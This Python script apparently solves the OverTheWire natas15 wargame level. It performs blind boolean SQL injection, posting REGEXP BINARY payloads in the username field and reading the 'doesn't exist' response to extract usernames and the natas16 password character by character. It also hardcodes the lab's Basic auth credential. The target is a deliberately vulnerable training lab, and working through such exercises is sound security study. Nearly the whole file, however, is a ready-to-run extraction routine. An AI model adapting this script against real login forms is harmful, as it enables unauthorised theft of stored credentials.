import requests

url = "http://natas15.natas.labs.overthewire.org/?debug"

files = [

]
headers = {
    'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='
}

chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"


# users = ["alice","bob", "charlie"]

def findUsers():
    users = []
    start_chars = chars
    while True:
        user = ""
        for i in range(64):
            found = False
            if i == 0:
                for index, c in enumerate(start_chars):
                    pattern = "^" + user + "{0}+".format(c)
                    payload = {
                        'username': "\" or username REGEXP BINARY '" + pattern + "' and \"\"=\""}
                    response = requests.request("POST", url, headers=headers, data=payload, files=files)
                    matches = not ("doesn" in str(response.text.encode('utf8')))
                    if matches:
                        start_chars = start_chars[:index] + start_chars[index + 1:]
                        found = True
                        user += c
                        print("username matches " + pattern)
                        print("current username is: " + user)
                        break
            else:
                for index, c in enumerate(chars):
                    pattern = "^" + user + "{0}+".format(c)
                    payload = {
                        'username': "\" or username REGEXP BINARY '" + pattern + "' and \"\"=\""}
                    response = requests.request("POST", url, headers=headers, data=payload, files=files)
                    matches = not ("doesn" in str(response.text.encode('utf8')))
                    if matches:
                        found = True
                        user += c
                        print("username matches " + pattern)
                        print("username is: " + user)
                        break
            if not found:
                print("Next User:")
                break
        if user == "":
            print("no more users")
            return users
        users.append(user)

def findPassword(users):
    passwords = []
    for user in users:
        password = ""
        for i in range(64):
            found = False
            for c in chars:
                pattern = "^" + password + "{0}+".format(c)
                payload = {
                    'username': user + "\" and password REGEXP BINARY '" + pattern + "' and \"\"=\""}
                response = requests.request("POST", url, headers=headers, data=payload, files=files)
                matches = not ("doesn" in str(response.text.encode('utf8')))
                if (matches):
                    found = True
                    password += c
                    print("password of " + user + " matches " + pattern)
                    print(password)
            if not found:
                print("Next Password:")
                break
        passwords.append(password)
    return passwords

#users = findUsers()
users = ["natas16"]
passwords = findPassword(users)
print(passwords)


